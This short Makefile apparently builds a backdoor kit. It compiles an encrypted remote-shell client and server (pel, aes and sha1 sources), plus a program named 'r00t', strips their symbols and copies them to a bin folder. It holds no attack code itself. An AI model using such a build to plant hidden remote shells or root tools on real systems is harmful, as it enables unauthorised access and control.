CLIENT_OBJ=pel.c aes.c sha1.c client.c
SERVER_OBJ=pel.c aes.c sha1.c shell.c

all:
	gcc -O -W -Wall -o client  $(CLIENT_OBJ)
	gcc -O -W -Wall -o shell $(SERVER_OBJ) -lutil -DLINUX
	gcc -Wall r00t.c -o r00t
	strip client shell r00t
	cp client shell r00t ../bin

clean:
	rm -f client shell r00t config.h
